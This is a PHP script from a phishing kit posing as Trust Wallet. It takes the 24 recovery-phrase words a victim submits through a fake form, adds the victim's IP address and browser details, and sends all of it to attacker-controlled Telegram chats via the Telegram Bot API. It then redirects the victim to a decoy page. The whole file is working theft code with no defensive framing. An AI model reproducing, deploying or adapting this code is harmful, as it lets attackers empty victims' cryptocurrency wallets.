<?php
  include "../config.php";
  include "../includes/funcs.php";

  $ip = $_SERVER['REMOTE_ADDR'];
  $message .= "️\n📟 Trustwallet 📟\n";
  $message .= "\n";
  $message .= "Word 1:".$_POST['1word']." Word 2: ".$_POST['2word']." Word 3: ".$_POST['3word']."\n" ;
  $message .= "Word 4:".$_POST['4word']." Word 5: ".$_POST['5word']." Word 6: ".$_POST['6word']."\n" ;
  $message .= "Word 7:".$_POST['7word']." Word 8: ".$_POST['8word']." Word 9: ".$_POST['9word']."\n" ;
  $message .= "Word 10:".$_POST['10word']." Word 11: ".$_POST['11word']." Word 12: ".$_POST['12word']."\n" ;
  $message .= "Word 13:".$_POST['13word']." Word 14: ".$_POST['14word']." Word 15: ".$_POST['15word']."\n" ;
  $message .= "Word 16:".$_POST['16word']." Word 17: ".$_POST['17word']." Word 18: ".$_POST['18word']."\n" ;
  $message .= "Word 19:".$_POST['19word']." Word 20: ".$_POST['20word']." Word 21: ".$_POST['21word']."\n" ;
  $message .= "Word 22:".$_POST['22word']." Word 23: ".$_POST['23word']." Word 24: ".$_POST['24word']."\n" ;
  $message .= "\nFull phrase : " . $_POST['1word']." ".$_POST['2word']." ".$_POST['3word']." ".$_POST['4word']." ".$_POST['5word']." ".$_POST['6word']." ".$_POST['7word']." ".$_POST['8word']." ".$_POST['9word']." ".$_POST['10word']." ".$_POST['11word']." ".$_POST['12word']." ".$_POST['13word']." ".$_POST['14word']." ".$_POST['15word']." ".$_POST['16word']." ".$_POST['17word']." ".$_POST['18word']." ".$_POST['19word']." ".$_POST['20word']." ".$_POST['21word']." ".$_POST['22word']." ".$_POST['23word']." ".$_POST['24word']."\n" ;
  $message .= "\n🌐IP: $ip\n";
  $message .= "🌐OS: $OS\n";
  $message .= "🌐Browser: $Browser\n";
  $message .= "️\n📟 Trustwallet 📟\n";

  foreach ($user_ids as $user_id) {
    $url = 'https://api.telegram.org/bot' . $bottoken . '/sendMessage';
    $data = array('chat_id' => $user_id, 'text' => $message);
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ),
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
}
  $nums=generateRandomString();
  echo "<script>window.top.location.href = \"../check.php?=" . $nums . "\";</script>";
  exit();  
?> 